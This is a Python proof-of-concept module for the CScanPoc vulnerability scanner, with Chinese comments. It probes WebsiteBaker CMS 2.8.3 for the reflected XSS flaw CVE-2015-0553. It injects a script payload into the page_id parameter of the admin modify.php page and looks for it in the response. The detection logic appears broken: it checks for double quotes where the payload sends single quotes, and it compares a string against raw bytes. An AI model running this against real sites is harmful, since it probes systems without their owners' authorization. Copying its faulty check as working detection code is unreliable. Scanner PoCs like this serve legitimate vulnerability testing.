# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Websitebaker-CMS_0001'  # 平台漏洞编号，留空
    name = 'Websitebaker-CMS v2.8.3 Reflecting XSS vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-01-05'  # 漏洞公布时间
    desc = '''
        WebsiteBaker可帮助您创建所需的网站：免费，简单，安全，灵活且可扩展的开源内容管理系统（CMS）。
        隐藏表单中引发的反射XSS漏洞。
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0553'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-0553'  # cve编号
    product = 'WebsiteBaker-CMS'  # 漏洞应用名称
    product_version = 'v2.8.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '927fa621-cbfc-416f-a36a-d2140a8095dd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/admin/pages/modify.php?page_id=1%22><script>alert(%27XSS%27)</script><!--'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '<script>alert("XSS")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
